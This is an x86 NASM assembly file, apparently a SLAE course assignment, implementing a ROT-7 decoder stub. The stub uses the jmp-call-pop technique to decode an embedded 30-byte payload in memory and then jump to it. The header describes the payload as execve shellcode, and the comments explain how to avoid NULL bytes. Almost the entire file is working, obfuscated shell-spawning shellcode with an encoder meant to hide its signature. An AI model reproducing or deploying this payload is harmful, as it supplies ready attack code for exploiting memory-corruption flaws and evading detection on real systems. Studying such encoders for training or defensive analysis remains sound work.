; Filename: rot-7-decoder.nasm
; Author:  msstavros
; Student-ID: SLAE-645 
;
; Purpose: ROT-7 shellcode decoder 
; Shellcode: execve-stack, 30 bytes length

global _start			

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi			;store pointer to shellcode in esi
	xor ecx, ecx		;initialize counter
	mov cl, 30		;shellcode length is 30

decode:
	cmp byte [esi], 0x07	;is it safe to subtract 7?
	jl lowbound		;if not (we need to wrap around 0)
	sub byte[esi], 0x07	;got unROTed value
	jmp short common_commands

lowbound:
	xor ebx, ebx		;we will need to compute (256-(7-bytevalue))
	xor edx, edx		;we will need two registers for that
	mov bl, 0x07
	mov dl, 0xff 		;we need to store 256d (100h) in DX
	inc dx			;we should not use a direct mov dx, 0x100 as 
				;this will introduce a NULL byte in our code
				;we want to avoid NULL characters at all times
	sub bl, byte [esi]	;compute first (7-bytevalue)
	sub dx, bx		;subtract this from 256
	mov byte [esi], dl	;got unROTed value, result always less than 100h
	
common_commands:
	inc esi			;move to next value in shellcode
	loop decode		;loop until cl=0

	jmp short Shellcode	;shellcode is decoded, jmp to it


call_decoder:

	call decoder
	Shellcode: db 0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87

